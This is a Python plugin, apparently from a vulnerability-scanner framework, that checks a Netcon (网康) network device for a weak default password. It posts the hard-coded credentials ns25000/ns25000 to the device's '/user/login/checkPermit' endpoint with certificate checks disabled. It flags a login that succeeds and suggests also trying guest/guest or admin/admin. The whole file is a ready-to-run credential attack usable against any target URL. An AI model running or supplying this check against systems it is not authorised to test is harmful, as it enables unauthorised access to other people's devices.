#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '网康弱口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/user/login/checkPermit'
  data = "usrname=ns25000&pass=ns25000"
  url1 = url + target
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    # if res.status_code == 200 and re.search(r'agreed.*?:true',res.text,re.S):
    if res.status_code == 200 and '{"agreed":true}' == res.text:
      # print(res.text)
      ret['huixian'] = "guest/guest或者可以再试试admin/admin"
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret